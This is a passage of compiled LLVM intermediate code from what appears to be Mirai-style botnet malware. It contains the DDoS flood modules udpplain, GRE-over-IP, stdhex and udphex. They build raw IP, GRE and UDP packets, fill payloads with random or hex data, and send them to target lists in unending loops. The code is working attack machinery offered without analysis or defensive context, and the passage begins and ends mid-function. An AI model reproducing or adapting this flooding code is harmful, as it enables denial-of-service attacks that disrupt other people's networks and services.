  %127 = load i32, i32* %6, align 4
  %128 = add i32 %127, 12
  %129 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %94, i8* %95, i16 zeroext %126, i32 %128)
  store i16 %129, i16* %123, align 2
  %130 = getelementptr inbounds i8, i8* %93, i64 22
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = load i32, i32* %5, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %134, i32 0, i32 1
  store i16 %132, i16* %135, align 2
  %136 = load i32, i32* %6, align 4
  %137 = sext i32 %136 to i64
  %138 = add nsw i64 %137, 32
  %139 = load i32, i32* %5, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %140, i32 0
  %142 = bitcast %struct.sockaddr_in* %141 to %struct.sockaddr*
  %143 = call i64 @sendto(i32 %23, i8* %93, i64 %138, i32 16384, %struct.sockaddr* %142, i32 16) #11
  %144 = load i32, i32* %5, align 4
  %145 = add nsw i32 %144, 1
  store i32 %145, i32* %5, align 4
  %146 = icmp slt i32 %145, %29
  br i1 %146, label %.lr.ph, label %.loopexit.loopexit

; <label>:147:                                    ; preds = %4, %32
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %59
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp ne i8 %0, 0
  %.mask = and i32 %14, 65535
  %34 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph62, %59
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %59 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = call zeroext i16 @htons(i16 zeroext %12) #12
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 17) #11
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %48 = load i32, i32* %44, align 4
  %49 = call i32 @bind(i32 %48, %struct.sockaddr* nonnull %31, i32 16) #11
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %51 = load i8, i8* %50, align 4
  %52 = icmp ult i8 %51, 32
  br i1 %52, label %53, label %59

; <label>:53:                                     ; preds = %47
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %55 = load i32, i32* %54, align 4
  %56 = call i32 @ntohl(i32 %55) #12
  %57 = call i32 @htonl(i32 %56) #12
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %57, i32* %58, align 4
  br label %59

; <label>:59:                                     ; preds = %53, %47
  %60 = load i32, i32* %44, align 4
  %61 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %62 = call i32 @connect(i32 %60, %struct.sockaddr* %61, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %63 = icmp slt i64 %indvars.iv.next, %32
  br i1 %63, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %64 = icmp eq i8 %16, 0
  %65 = and i32 %14, 65535
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %70
  %.160 = phi i32 [ %.mux, %70 ], [ 0, %.lr.ph.preheader ]
  %66 = sext i32 %.160 to i64
  %67 = getelementptr inbounds i8*, i8** %8, i64 %66
  %68 = load i8*, i8** %67, align 8
  br i1 %64, label %70, label %69

; <label>:69:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %68, i32 %65)
  br label %70

; <label>:70:                                     ; preds = %.lr.ph, %69
  %71 = getelementptr inbounds i32, i32* %10, i64 %66
  %72 = load i32, i32* %71, align 4
  %73 = call i64 @send(i32 %72, i8* %68, i64 %34, i32 16384) #11
  %74 = add nsw i32 %.160, 1
  %75 = icmp slt i32 %74, %24
  %brmerge = or i1 %75, %33
  %.mux = select i1 %75, i32 %74, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %70
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %26)
  %28 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %195, label %30

; <label>:30:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %31 = bitcast i32* %5 to i8*
  %32 = call i32 @setsockopt(i32 %28, i32 0, i32 3, i8* nonnull %31, i32 4) #11
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %48, label %.preheader125

.preheader125:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %34 = zext i8 %0 to i32
  %35 = icmp eq i8 %0, 0
  br i1 %35, label %.preheader, label %.lr.ph127

.lr.ph127:                                        ; preds = %.preheader125
  %36 = sext i32 %21 to i64
  %37 = add nsw i64 %36, 52
  %38 = trunc i64 %37 to i16
  %39 = icmp ne i8 %16, 0
  %40 = add nsw i64 %36, 28
  %41 = trunc i64 %40 to i16
  %42 = xor i16 %12, -1
  %43 = icmp eq i8 %25, 0
  %44 = add nsw i64 %36, 8
  %45 = trunc i64 %44 to i16
  %.promoted = load i32, i32* %5, align 4
  %46 = sext i32 %.promoted to i64
  %47 = zext i8 %0 to i64
  br label %64

; <label>:48:                                     ; preds = %30
  %49 = call i32 @close(i32 %28) #11
  br label %195

..preheader_crit_edge:                            ; preds = %108
  %50 = trunc i64 %indvars.iv.next to i32
  store i32 %50, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader125, %..preheader_crit_edge
  %51 = icmp eq i8 %0, 0
  %52 = icmp eq i32 %27, -1
  %53 = and i32 %11, 65535
  %54 = icmp eq i32 %53, 65535
  %55 = and i32 %17, 65535
  %56 = icmp eq i32 %55, 65535
  %57 = and i32 %19, 65535
  %58 = icmp eq i32 %57, 65535
  %59 = icmp eq i8 %25, 0
  %60 = icmp eq i8 %23, 0
  %61 = sext i32 %21 to i64
  %62 = add i32 %21, 8
  %63 = add nsw i64 %61, 52
  br label %.loopexit

; <label>:64:                                     ; preds = %.lr.ph127, %108
  %indvars.iv = phi i64 [ %46, %.lr.ph127 ], [ %indvars.iv.next, %108 ]
  %65 = call noalias i8* @calloc(i64 1510, i64 8) #11
  %66 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %65, i8** %66, align 8
  %67 = getelementptr inbounds i8, i8* %65, i64 24
  %68 = getelementptr inbounds i8, i8* %65, i64 44
  store i8 69, i8* %65, align 4
  %69 = getelementptr inbounds i8, i8* %65, i64 1
  store i8 %10, i8* %69, align 1
  %70 = call zeroext i16 @htons(i16 zeroext %38) #12
  %71 = getelementptr inbounds i8, i8* %65, i64 2
  %72 = bitcast i8* %71 to i16*
  store i16 %70, i16* %72, align 2
  %73 = call zeroext i16 @htons(i16 zeroext %12) #12
  %74 = getelementptr inbounds i8, i8* %65, i64 4
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 4
  %76 = getelementptr inbounds i8, i8* %65, i64 8
  store i8 %14, i8* %76, align 4
  br i1 %39, label %77, label %81

; <label>:77:                                     ; preds = %64
  %78 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %79 = getelementptr inbounds i8, i8* %65, i64 6
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 2
  br label %81

; <label>:81:                                     ; preds = %77, %64
  %82 = getelementptr inbounds i8, i8* %65, i64 9
  store i8 47, i8* %82, align 1
  %83 = getelementptr inbounds i8, i8* %65, i64 12
  %84 = bitcast i8* %83 to i32*
  store i32 %27, i32* %84, align 4
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %86 = load i32, i32* %85, align 4
  %87 = getelementptr inbounds i8, i8* %65, i64 16
  %88 = bitcast i8* %87 to i32*
  store i32 %86, i32* %88, align 4
  %89 = call zeroext i16 @htons(i16 zeroext 2048) #12
  %90 = getelementptr inbounds i8, i8* %65, i64 22
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  store i8 69, i8* %67, align 4
  %92 = getelementptr inbounds i8, i8* %65, i64 25
  store i8 %10, i8* %92, align 1
  %93 = call zeroext i16 @htons(i16 zeroext %41) #12
  %94 = getelementptr inbounds i8, i8* %65, i64 26
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  %96 = call zeroext i16 @htons(i16 zeroext %42) #12
  %97 = getelementptr inbounds i8, i8* %65, i64 28
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 4
  %99 = getelementptr inbounds i8, i8* %65, i64 32
  store i8 %14, i8* %99, align 4
  br i1 %39, label %100, label %104

; <label>:100:                                    ; preds = %81
  %101 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %102 = getelementptr inbounds i8, i8* %65, i64 30
  %103 = bitcast i8* %102 to i16*
  store i16 %101, i16* %103, align 2
  br label %104

; <label>:104:                                    ; preds = %100, %81
  %105 = getelementptr inbounds i8, i8* %65, i64 33
  store i8 17, i8* %105, align 1
  br i1 %43, label %108, label %106

; <label>:106:                                    ; preds = %104
  %107 = load i32, i32* %88, align 4
  br label %108

; <label>:108:                                    ; preds = %104, %106
  %.sink = phi i32 [ %107, %106 ], [ 1023, %104 ]
  %109 = getelementptr inbounds i8, i8* %65, i64 40
  %110 = bitcast i8* %109 to i32*
  store i32 %.sink, i32* %110, align 4
  %111 = call zeroext i16 @htons(i16 zeroext %18) #12
  %112 = bitcast i8* %68 to i16*
  store i16 %111, i16* %112, align 2
  %113 = call zeroext i16 @htons(i16 zeroext %20) #12
  %114 = getelementptr inbounds i8, i8* %65, i64 46
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = call zeroext i16 @htons(i16 zeroext %45) #12
  %117 = getelementptr inbounds i8, i8* %65, i64 48
  %118 = bitcast i8* %117 to i16*
  store i16 %116, i16* %118, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %119 = icmp slt i64 %indvars.iv.next, %47
  br i1 %119, label %64, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %163
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %51, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %163
  %storemerge124126 = phi i32 [ %193, %163 ], [ 0, %.lr.ph.preheader ]
  %120 = sext i32 %storemerge124126 to i64
  %121 = getelementptr inbounds i8*, i8** %8, i64 %120
  %122 = load i8*, i8** %121, align 8
  %123 = getelementptr inbounds i8, i8* %122, i64 24
  %124 = bitcast i8* %123 to %struct.iphdr*
  %125 = getelementptr inbounds i8, i8* %122, i64 44
  %126 = getelementptr inbounds i8, i8* %122, i64 52
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %120, i32 2
  %128 = load i8, i8* %127, align 4
  %129 = icmp ult i8 %128, 32
  br i1 %129, label %130, label %137

; <label>:130:                                    ; preds = %.lr.ph
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %120, i32 1
  %132 = load i32, i32* %131, align 4
  %133 = call i32 @ntohl(i32 %132) #12
  %134 = call i32 @htonl(i32 %133) #12
  %135 = getelementptr inbounds i8, i8* %122, i64 16
  %136 = bitcast i8* %135 to i32*
  store i32 %134, i32* %136, align 4
  br label %137

; <label>:137:                                    ; preds = %130, %.lr.ph
  br i1 %52, label %138, label %141

; <label>:138:                                    ; preds = %137
  %139 = getelementptr inbounds i8, i8* %122, i64 12
  %140 = bitcast i8* %139 to i32*
  store i32 0, i32* %140, align 4
  br label %141

; <label>:141:                                    ; preds = %138, %137
  br i1 %54, label %142, label %147

; <label>:142:                                    ; preds = %141
  %143 = getelementptr inbounds i8, i8* %122, i64 4
  %144 = bitcast i8* %143 to i16*
  store i16 0, i16* %144, align 4
  %145 = getelementptr inbounds i8, i8* %122, i64 28
  %146 = bitcast i8* %145 to i16*
  store i16 999, i16* %146, align 4
  br label %147

; <label>:147:                                    ; preds = %142, %141
  br i1 %56, label %148, label %150

; <label>:148:                                    ; preds = %147
  %149 = bitcast i8* %125 to i16*
  store i16 0, i16* %149, align 2
  br label %150

; <label>:150:                                    ; preds = %148, %147
  br i1 %58, label %151, label %154

; <label>:151:                                    ; preds = %150
  %152 = getelementptr inbounds i8, i8* %122, i64 46
  %153 = bitcast i8* %152 to i16*
  store i16 0, i16* %153, align 2
  br label %154

; <label>:154:                                    ; preds = %151, %150
  br i1 %59, label %159, label %155

; <label>:155:                                    ; preds = %154
  %156 = getelementptr inbounds i8, i8* %122, i64 16
  %157 = bitcast i8* %156 to i32*
  %158 = load i32, i32* %157, align 4
  br label %159

; <label>:159:                                    ; preds = %154, %155
  %.sink3 = phi i32 [ %158, %155 ], [ 0, %154 ]
  %160 = getelementptr inbounds i8, i8* %122, i64 40
  %161 = bitcast i8* %160 to i32*
  store i32 %.sink3, i32* %161, align 4
  br i1 %60, label %163, label %162

; <label>:162:                                    ; preds = %159
  call void @rand_str(i8* nonnull %126, i32 %21)
  br label %163

; <label>:163:                                    ; preds = %159, %162
  %164 = getelementptr inbounds i8, i8* %122, i64 10
  %165 = bitcast i8* %164 to i16*
  store i16 0, i16* %165, align 2
  %166 = bitcast i8* %122 to i16*
  %167 = call zeroext i16 @checksum_generic(i16* %166, i32 20)
  store i16 %167, i16* %165, align 2
  %168 = getelementptr inbounds i8, i8* %122, i64 34
  %169 = bitcast i8* %168 to i16*
  store i16 0, i16* %169, align 2
  %170 = bitcast i8* %123 to i16*
  %171 = call zeroext i16 @checksum_generic(i16* %170, i32 20)
  store i16 %171, i16* %169, align 2
  %172 = getelementptr inbounds i8, i8* %122, i64 50
  %173 = bitcast i8* %172 to i16*
  store i16 0, i16* %173, align 2
  %174 = getelementptr inbounds i8, i8* %122, i64 48
  %175 = bitcast i8* %174 to i16*
  %176 = load i16, i16* %175, align 2
  %177 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %124, i8* nonnull %125, i16 zeroext %176, i32 %62)
  store i16 %177, i16* %173, align 2
  %178 = load i32, i32* %5, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %179, i32 0, i32 0
  store i16 2, i16* %180, align 4
  %181 = getelementptr inbounds i8, i8* %122, i64 16
  %182 = bitcast i8* %181 to i32*
  %183 = load i32, i32* %182, align 4
  %184 = load i32, i32* %5, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %185, i32 0, i32 2, i32 0
  store i32 %183, i32* %186, align 4
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %185, i32 0, i32 1
  store i16 0, i16* %187, align 2
  %188 = sext i32 %184 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %188, i32 0
  %190 = bitcast %struct.sockaddr_in* %189 to %struct.sockaddr*
  %191 = call i64 @sendto(i32 %28, i8* nonnull %122, i64 %63, i32 16384, %struct.sockaddr* %190, i32 16) #11
  %192 = load i32, i32* %5, align 4
  %193 = add nsw i32 %192, 1
  store i32 %193, i32* %5, align 4
  %194 = icmp slt i32 %193, %34
  br i1 %194, label %.lr.ph, label %.loopexit.loopexit

; <label>:195:                                    ; preds = %4, %48
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1294)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.061 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %._crit_edge, label %.lr.ph65

.lr.ph65:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %33

; <label>:33:                                     ; preds = %.lr.ph65, %57
  %indvars.iv = phi i64 [ 0, %.lr.ph65 ], [ %indvars.iv.next, %57 ]
  %34 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %35 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %34, i8** %35, align 8
  br i1 %27, label %38, label %36

; <label>:36:                                     ; preds = %33
  %37 = call zeroext i16 @htons(i16 zeroext %12) #12
  br label %38

; <label>:38:                                     ; preds = %33, %36
  %.sink = phi i16 [ %37, %36 ], [ 0, %33 ]
  %39 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %40 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %40, align 2
  %41 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %42 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %41, i32* %42, align 4
  %43 = icmp eq i32 %41, -1
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %38
  ret void

; <label>:45:                                     ; preds = %38
  store i16 2, i16* %28, align 4
  store i16 %.061, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %46 = load i32, i32* %42, align 4
  %47 = call i32 @bind(i32 %46, %struct.sockaddr* nonnull %31, i32 16) #11
  %48 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %49 = load i8, i8* %48, align 4
  %50 = icmp ult i8 %49, 32
  br i1 %50, label %51, label %57

; <label>:51:                                     ; preds = %45
  %52 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %53 = load i32, i32* %52, align 4
  %54 = call i32 @ntohl(i32 %53) #12
  %55 = call i32 @htonl(i32 %54) #12
  %56 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %55, i32* %56, align 4
  br label %57

; <label>:57:                                     ; preds = %51, %45
  %58 = load i32, i32* %42, align 4
  %59 = bitcast %struct.attack_target* %39 to %struct.sockaddr*
  %60 = call i32 @connect(i32 %58, %struct.sockaddr* %59, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %61 = icmp slt i64 %indvars.iv.next, %32
  br i1 %61, label %33, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %57
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %23
  %62 = load i8*, i8** @hexPayload, align 8
  %63 = call i64 @strlen(i8* %62) #14
  %64 = icmp ne i8 %0, 0
  %.mask = and i32 %14, 65535
  %sext = shl i64 %63, 32
  %65 = ashr exact i64 %sext, 32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %._crit_edge
  br i1 %64, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %66 = icmp eq i8 %16, 0
  %67 = zext i32 %.mask to i64
  %68 = and i32 %14, 65535
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %73
  %.163 = phi i32 [ %.mux, %73 ], [ 0, %.lr.ph.preheader ]
  %69 = sext i32 %.163 to i64
  %70 = getelementptr inbounds i8*, i8** %8, i64 %69
  %71 = load i8*, i8** %70, align 8
  br i1 %66, label %73, label %72

; <label>:72:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %71, i32 %68)
  br label %73

; <label>:73:                                     ; preds = %.lr.ph, %72
  %74 = getelementptr inbounds i32, i32* %10, i64 %69
  %75 = load i32, i32* %74, align 4
  %76 = call i64 @send(i32 %75, i8* %71, i64 %67, i32 16384) #11
  %77 = load i8*, i8** @hexPayload, align 8
  %78 = call i64 @send(i32 %75, i8* %77, i64 %65, i32 16384) #11
  %79 = add nsw i32 %.163, 1
  %80 = icmp slt i32 %79, %24
  %brmerge = or i1 %80, %64
  %.mux = select i1 %80, i32 %79, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %73
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udphex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1294)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.056 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph60

.lr.ph60:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %59
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp ne i8 %0, 0
  %34 = icmp eq i8 %16, 0
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph60, %59
  %indvars.iv = phi i64 [ 0, %.lr.ph60 ], [ %indvars.iv.next, %59 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
